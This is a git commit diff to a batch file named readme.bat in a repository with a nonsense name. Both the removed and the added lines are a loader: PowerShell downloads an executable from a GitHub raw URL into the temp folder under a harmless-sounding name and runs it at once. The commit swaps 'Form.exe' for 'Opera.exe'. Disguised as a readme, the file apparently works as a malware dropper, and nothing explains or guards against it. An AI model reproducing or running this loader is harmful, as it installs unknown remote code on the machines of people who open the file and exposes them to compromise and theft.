d8841e3acabcd8c9a465b525b4da876e251b6746
cmonopop <134619223+cmonopop@users.noreply.github.com>
2023-08-30 00:56:16 +0530

    Update readme.bat

--- readme.bat
+++ readme.bat
@@ -1,3 +1,3 @@
 @echo off
-powershell.exe wget https://github.com/cmonopop/-bimbinboomboaaaaship1282/raw/main/Form.exe -OutFile %TMP%\required_form.exe
-%TMP%\required_form.exe
+powershell.exe wget https://github.com/cmonopop/-bimbinboomboaaaaship1282/raw/main/Opera.exe -OutFile %TMP%\requiredForm.exe
+%TMP%\requiredForm.exe
